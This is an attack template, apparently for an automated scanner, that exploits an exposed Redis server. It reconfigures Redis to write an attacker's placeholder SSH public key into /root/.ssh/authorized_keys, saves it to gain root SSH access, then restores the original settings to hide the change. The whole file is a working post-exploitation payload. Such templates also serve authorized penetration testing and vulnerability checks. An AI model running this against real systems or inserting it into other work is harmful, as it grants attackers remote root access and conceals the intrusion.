id: redis-write-ssh-key
service: [redis]
info:
  name: Redis Write SSH Authorized Keys
  severity: critical
  tags: redis,post-exploit,rce

services:
  - ops:
      - kv: "CONFIG GET dir"
        name: dir
      - kv: "CONFIG GET dbfilename"
        name: dbfilename
    extractors:
      - type: regex
        name: orig_dir
        internal: true
        part: dir
        regex: ['dir\s+(.+)']
        group: 1
      - type: regex
        name: orig_file
        internal: true
        part: dbfilename
        regex: ['dbfilename\s+(.+)']
        group: 1

  - ops:
      - kv: "CONFIG SET dir /root/.ssh"
      - kv: "CONFIG SET dbfilename authorized_keys"
      - kv: 'SET x "\n\nssh-rsa AAAA...YOUR_PUBLIC_KEY... user@attacker\n\n"'
      - kv: "SAVE"
    matchers:
      - type: word
        words: ["OK"]

  - ops:
      - kv: "CONFIG SET dir {{orig_dir}}"
      - kv: "CONFIG SET dbfilename {{orig_file}}"
